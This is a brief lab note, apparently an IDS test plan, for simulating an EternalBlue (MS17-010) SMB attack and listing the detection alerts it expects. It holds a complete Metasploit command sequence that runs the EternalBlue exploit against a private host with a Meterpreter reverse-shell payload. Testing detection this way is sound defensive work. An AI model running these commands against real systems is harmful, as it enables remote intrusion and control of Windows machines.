# EternalBlue Attack Simulation

## Objective
Simulate SMB exploit traffic to test IDS detection.

## Tools
- Metasploit Framework (Lab environment)

## Example Command (Simulation)
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

## Expected Detection
- IDS alert: SMB exploit attempt
- Signature: MS17-010
- Severity: High

⚠️ Exploit execution is **not performed** in production.

